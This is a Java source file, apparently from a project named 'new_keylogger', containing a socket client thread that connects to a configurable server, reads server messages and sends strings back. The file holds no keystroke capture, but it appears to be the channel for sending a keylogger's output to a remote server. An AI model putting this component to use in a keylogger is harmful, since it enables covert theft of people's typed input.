package com.example.new_keylogger;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

class ClientThread implements Runnable {
    private Socket socket;
    private final String SERVER_IP;
    private final int SERVER_PORT;
    public boolean Connected = false;
    public String serverMessage;

    public ClientThread(String SERVER_IP, int SERVER_PORT) {
        this.SERVER_IP = SERVER_IP;
        this.SERVER_PORT = SERVER_PORT;
    }


    @Override
    public void run() {
        Boolean newServerMessage = false;
        try {
            InetAddress serverAddr = InetAddress.getByName(SERVER_IP);
            socket = new Socket(serverAddr, SERVER_PORT);
            this.Connected = true;
            while (!Thread.currentThread().isInterrupted()) {
                BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String message = input.readLine();
                if (!(message == null) ) {
                    serverMessage = message;
                } else if ( Thread.interrupted() ) {
                    message = "Server Disconnected: " + false;
                    this.Connected = false;
                    break;
                };
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    void sendMessage(final String message) {
        new Thread(() -> {
            try {
                if (null != socket) {
                    DataOutputStream streamOut = new DataOutputStream(socket.getOutputStream());
                    streamOut.writeUTF(message);
                    streamOut.flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

}